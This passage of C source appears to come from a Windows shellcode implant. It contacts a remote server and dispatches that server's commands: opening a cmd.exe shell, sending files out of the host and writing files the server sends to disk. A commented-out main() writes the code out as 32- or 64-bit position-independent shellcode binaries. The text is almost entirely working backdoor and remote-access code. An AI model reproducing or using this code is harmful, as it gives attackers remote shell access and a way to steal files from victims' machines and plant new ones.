        break;
      }
      // end of file?
      if (eof) {
        DEBUG_PRINT("EOF reached");
        break;
      }
    }
    // close file
    x->f.pCloseHandle(in);
  }
  DEBUG_PRINT("c_get ending");
}

/**F*********************************************
 *
 * Receive file from server
 *
 ************************************************/
void c_put(sc_tbl *x)
{
  HANDLE out;
  DWORD  wn;
  
  DEBUG_PRINT("c_put: receiving %s from server...", 
    x->v.blk.data.cmd.buf);
  
  // try create file
  out=x->f.pCreateFile ((LPCTSTR)x->v.blk.data.cmd.buf, 
      GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, NULL);

  // report creation status to server
  x->v.blk.data.fx.err = x->f.pGetLastError();
  x->v.blk.len.w       = sizeof(DWORD);
  spp_send(x);
  
  // if file opened
  if (out!=INVALID_HANDLE_VALUE) {
    DEBUG_PRINT("okay");
    for (;;) 
    {
      // receive data
      if (spp_recv(x)!=SPP_ERR_OK) {
        break;
      }
      // if EOF goto step 7
      if (x->v.blk.len.w==0) {
        DEBUG_PRINT("Received EOF");
        break;
      }
      // write data to file
      x->f.pWriteFile (out, x->v.blk.data.b, 
          x->v.blk.len.w, &wn, 0);
    }
    // close file
    x->f.pCloseHandle (out);
  }
  DEBUG_PRINT("c_put: ending");
}

/**F*********************************************
 *
 * Dispatcher function
 *
 ************************************************/
void dispatch(sc_tbl *x)
{
  DWORD e, end=0;
  int   len;
  
  DEBUG_PRINT("entering dispatcher");
  
  // create event for socket
  x->v.evt0 = x->f.pWSACreateEvent();
  // increase event count
  x->v.evt_cnt++;
  
  do {
    e=wait_evt(x);
    
    if (e!=0) {
      DEBUG_PRINT("received %08X event", e);
      break;
    }
    // receive data
    len=spp_recv(x);
    
    if (len!=SPP_ERR_OK) {
      DEBUG_PRINT("spp_recv: %08X", len);
      break;
    }
    // inspect command option
    switch(x->v.blk.data.cmd.opt)
    {
      case SPP_CMD_TERM:
        DEBUG_PRINT("Terminating dispatcher");
        end++;
        break;
      case SPP_CMD_SHELL:
        DEBUG_PRINT("Executing cmd.exe");
        c_cmd(x);
        break;
      case SPP_CMD_GET:
        DEBUG_PRINT("Server wants to download file");
        c_get(x);
        break;
      case SPP_CMD_PUT:
        DEBUG_PRINT("Server wants to upload file");
        c_put(x);
        break;
    } 
  } while(!end);
  // close socket event handle
  x->f.pCloseHandle(x->v.evt0);
}

/*#ifndef XALONE
 DO NOT USE
#pragma comment(lib, "user32.lib")

void CODE_END() { };

int main(void)
{
  int    wn, cpu;
  HANDLE out;
  char   fname[MAX_PATH];
  
#if defined(__i386__) || defined(_M_IX86)
  cpu = 32;
#else
  cpu = 64;
#endif

  printf ("\n[ Creating %i-bit PIC\n", cpu);
  wsprintf (fname, "spz%i.bin", cpu);
  
  out = CreateFile(fname, GENERIC_WRITE, 
    0, NULL, CREATE_ALWAYS, 0, NULL);

  if (out != INVALID_HANDLE_VALUE)
  {
    WriteFile(out, &entrypoint, 
      ((DWORD)&CODE_END - (DWORD)&entrypoint), &wn, NULL);
      
    CloseHandle(out);
  } else {
    printf ("[ unable to create spz.bin\n");
  }
}
#endif
*/